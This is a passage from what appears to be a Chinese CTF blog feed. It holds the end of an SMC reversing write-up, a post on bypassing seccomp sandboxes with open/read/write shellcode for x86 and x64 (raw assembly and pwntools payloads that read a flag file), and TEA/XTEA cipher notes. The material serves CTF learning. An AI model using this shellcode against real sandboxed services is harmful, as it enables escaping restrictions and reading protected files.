<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add1=<span class="number">0x404000</span></span><br><span class="line">add2=<span class="number">0x405000</span></span><br><span class="line">key=<span class="string">&quot;sycloversyclover&quot;</span></span><br><span class="line">bb=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(add1,add2,<span class="number">1</span>):</span><br><span class="line">    wr=(~(idc.get_wide_byte(i) ^ <span class="built_in">ord</span>(key[bb%<span class="built_in">len</span>(key)]))&amp;<span class="number">0xff</span>) <span class="comment">#这里&amp;0xff是避免取反时高位补一</span></span><br><span class="line">    ida_bytes.patch_byte(i,wr) </span><br><span class="line">    bb+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_404000</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr); ++i )</span><br><span class="line">    --aPvfqyc4ttc2uxr[i];</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">  <span class="keyword">if</span> ( (result &amp; <span class="number">0xFFFFFFFE</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = result - v1;</span><br><span class="line">      v4 = *(_BYTE *)(v3 + <span class="number">4231191</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">4231191</span>) = aPvfqyc4ttc2uxr[v1];</span><br><span class="line">      aPvfqyc4ttc2uxr[v1++] = v4;</span><br><span class="line">      result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v1 &lt; result &gt;&gt; <span class="number">1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密得到nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo&#x3D;</p>
<p>最后秘钥为sycloversyclover，偏移量为sctfsctfsctfsctf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sctf&#123;Ae3_C8c_I28_pKcs79ad4&#125;</span><br></pre></td></tr></table></figure>



<h2 id="烽火杯的smc"><a href="#烽火杯的smc" class="headerlink" title="烽火杯的smc"></a>烽火杯的smc</h2><p>这个算是最简单的反调试改jz就可以，直接linux动调就可以还原了，就不都说了xixi。</p>
]]></content>
      <categories>
        <category>reverse</category>
        <category>总结</category>
        <category>smc</category>
      </categories>
  </entry>
  <entry>
    <title>sandbox绕过</title>
    <url>/2025/03/02/sandbox%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="sandbox-orw"><a href="#sandbox-orw" class="headerlink" title="sandbox_orw"></a>sandbox_orw</h1><ul>
<li><p><a href="#shellcode%E7%BB%95%E8%BF%87">shellcode绕过</a></p>
<ul>
<li><p><a href="#x32">x32</a></p>
</li>
<li><p><a href="#x64">x64</a></p>
</li>
</ul>
</li>
</ul>
<p>sandbox一般就是禁用了<code>execve</code>函数使我们没办法直接通过<code>system(/bin/sh\x00)</code>来getshell。如果会出现prctl,seccomp的话很可能就要用orw进行绕过。就是利用open，read，write(orw)。</p>
<p>首先用seccomp-tools查看沙箱</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br><span class="line">seccomp-tools dump ./elf</span><br></pre></td></tr></table></figure>



<h2 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h2><h3 id="x32"><a href="#x32" class="headerlink" title="x32"></a>x32</h3><p>汇编代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#0x67616c66根据文件名改动</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>利用pwntools</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = shellcraft.i386.<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line">payload += shellcraft.i386.read(<span class="number">0x3</span>, save_to, <span class="number">0x100</span>)</span><br><span class="line">payload += shellcraft.i386.write(<span class="number">0x1</span>, save_to, <span class="number">0x100</span>)</span><br><span class="line">sh.sendline(asm(payload))</span><br></pre></td></tr></table></figure>

<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>汇编代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rax,<span class="subst">&#123;convert_str_asmencode(<span class="string">&quot;././flag&quot;</span>)&#125;</span>;#根据文件名改动</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,2;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rdi,rax;</span></span><br><span class="line"><span class="string">mov dl,0x40;</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov al,0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">xor rdi,rdi;</span></span><br><span class="line"><span class="string">mov al,1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>stack</category>
        <category>sandbox</category>
      </categories>
  </entry>
  <entry>
    <title>tea加解密学习</title>
    <url>/2025/08/31/tea%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>开始tea加密的学习</p>
<h2 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h2><h3 id="加密："><a href="#加密：" class="headerlink" title="加密："></a>加密：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, i;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 明文分组（小端序十六进制）</span></span><br><span class="line">    <span class="type">uint32_t</span> plaintext[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x67616C66</span>, <span class="number">0x3332317B</span>, <span class="number">0x37363534</span>, <span class="number">0x30303938</span>,</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x7D353433</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 密钥（小端序十六进制）</span></span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印原始明文</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;原始明文（小端序十六进制）:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, plaintext[i]);</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对每个64位分组进行加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123; plaintext[i], plaintext[i + <span class="number">1</span>] &#125;;</span><br><span class="line">        encrypt(v, key);</span><br><span class="line">        plaintext[i] = v[<span class="number">0</span>];</span><br><span class="line">        plaintext[i + <span class="number">1</span>] = v[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印加密后的密文</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n加密后的密文（小端序十六进制）:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, plaintext[i]);</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python和c与语言在tea加密的时候会发现有时候会不一样，其中有可能是小端序储存的问题。</p>
<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0xC6EF3720</span>, i;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span>&#125;; <span class="comment">// 密钥</span></span><br><span class="line">    <span class="type">uint32_t</span> blocks[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">0x4438A9E2</span>, <span class="number">0x39D00322</span>&#125;, <span class="comment">// 密文块1</span></span><br><span class="line">        &#123;<span class="number">0x55564858</span>, <span class="number">0x0414AC05</span>&#125;, <span class="comment">// 密文块2</span></span><br><span class="line">        &#123;<span class="number">0x4D66EF71</span>, <span class="number">0x5ABD1754</span>&#125;, <span class="comment">// 密文块3</span></span><br><span class="line">        &#123;<span class="number">0x94554B4A</span>, <span class="number">0x8F3245C0</span>&#125;  <span class="comment">// 密文块4</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123;blocks[i][<span class="number">0</span>], blocks[i][<span class="number">1</span>]&#125;;</span><br><span class="line">        decrypt(v, k);</span><br><span class="line">        <span class="comment">// 将解密后的uint32_t转换为小端序字节序列并输出</span></span><br><span class="line">        <span class="type">uint8_t</span> *bytes = (<span class="type">uint8_t</span> *)v;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, bytes[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>TEA（Tiny Encryption Algorithm）是一种分组密码算法，由David Wheeler和Roger Needham于1994年提出。它采用64位数据块和128位</p>
<p>密钥，具有简单、高效的特点。算法使用32轮循环的Feistel结构，每轮操作包括移位、异或和加法</p>
<h3 id="最常魔改点"><a href="#最常魔改点" class="headerlink" title="最常魔改点"></a>最常魔改点</h3><p>delta &#x3D; 0x9e3779b9(标准)   这里经常会被换成别的数据</p>
<p>在反汇编中x-&#x3D;0x61c88647和x+&#x3D;0x9e3779b9，这两个值是等价的。</p>
<p>进行32轮循环，每轮执行以下操作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sum += delta;</span><br><span class="line">v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br></pre></td></tr></table></figure>

<p>解密的换就反过来进行32次就可以了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">sum -= delta;</span><br></pre></td></tr></table></figure>



<h2 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* XTEA加密函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 原始明文(小端序十六进制)</span></span><br><span class="line">    <span class="type">uint32_t</span> plaintext[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x67616C66</span>, <span class="number">0x3332317B</span>, <span class="number">0x37363534</span>, <span class="number">0x30303938</span>,</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x7D353433</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 原始密钥(小端序十六进制)</span></span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> num_rounds = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;原始明文:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08X &quot;</span>, plaintext[i]);</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对每个64位块进行加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> block[<span class="number">2</span>] = &#123; plaintext[i], plaintext[i + <span class="number">1</span>] &#125;;</span><br><span class="line">        encipher(num_rounds, block, key);</span><br><span class="line">        plaintext[i] = block[<span class="number">0</span>];</span><br><span class="line">        plaintext[i + <span class="number">1</span>] = block[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n加密后的密文:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08X &quot;</span>, plaintext[i]);</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x9E3779B9</span>, sum = delta * num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>] = &#123; <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span> &#125;; <span class="comment">// 密钥</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r = <span class="number">32</span>; <span class="comment">// 轮数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 密文分组</span></span><br><span class="line">    <span class="type">uint32_t</span> ciphertext[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">0x37DB3CE9</span>, <span class="number">0x6C07F159</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0xE1893135</span>, <span class="number">0x57978EA8</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0xB159F7E6</span>, <span class="number">0x439F8389</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x988499C3</span>, <span class="number">0x9765BBF9</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123; ciphertext[i][<span class="number">0</span>], ciphertext[i][<span class="number">1</span>] &#125;;</span><br><span class="line">        decipher(r, v, key);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;组 %d: 0x%08X 0x%08X\n&quot;</span>, i + <span class="number">1</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将解密后的32位整数转换为字节序列（小端序）以显示为字符串</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>* bytes = (<span class="type">unsigned</span> <span class="type">char</span>*)v;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;        作为字节序列: &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, bytes[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n        可能作为字符串: &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bytes[j] &gt;= <span class="number">32</span> &amp;&amp; bytes[j] &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, bytes[j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>XTEA（eXtended TEA）是 TEA 算法的改进版，由 David Wheeler 和 Roger Needham 于 1997 年提出，主要修复了 TEA 的相关密钥攻击漏洞，以 64 位为数据块、128 位为密钥，通过 32 轮包含加 &#x2F; 减、循环移位和异或的操作实现加密解密，因轻量易实现、对资源需求低，常用于嵌入式设备等场景。</p>
<h3 id="最常魔改点-1"><a href="#最常魔改点-1" class="headerlink" title="最常魔改点"></a>最常魔改点</h3><p><code>delta</code>是魔数0x9E3779B9   这个数据经常被换。</p>
<p>加密核心</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9E3779B9</span>; <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]); <span class="comment">// 对左半块操作</span></span><br><span class="line">        sum += delta; <span class="comment">// 更新“轮常量”</span></span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]); <span class="comment">// 对右半块操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; <span class="comment">// 加密后的左半块</span></span><br><span class="line">    v[<span class="number">1</span>] = v1; <span class="comment">// 加密后的右半块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密的换就反过来进行</p>
